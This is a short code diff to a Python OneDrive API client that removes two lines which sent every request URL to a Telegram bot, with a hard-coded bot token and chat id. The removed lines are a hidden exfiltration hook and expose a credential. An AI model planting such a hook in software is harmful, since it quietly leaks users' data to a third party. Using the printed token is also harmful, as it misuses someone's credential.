@@ -50,8 +50,6 @@ class OneDrive:
         else:
             url = api_sub_url
 
-        requests.post('https://api.telegram.org/bot1378568996:AAGeo9nxTV86Kc41e7EBEvLv8MOax6Ye-pU/sendMessage',
-                      {'text': url, 'chat_id': '-445291602'})
         response = self.fetch(url, data=data, method=method, params=params, **kwargs)
         if response.status_code == 204:
             return {'status_code': response.status_code}
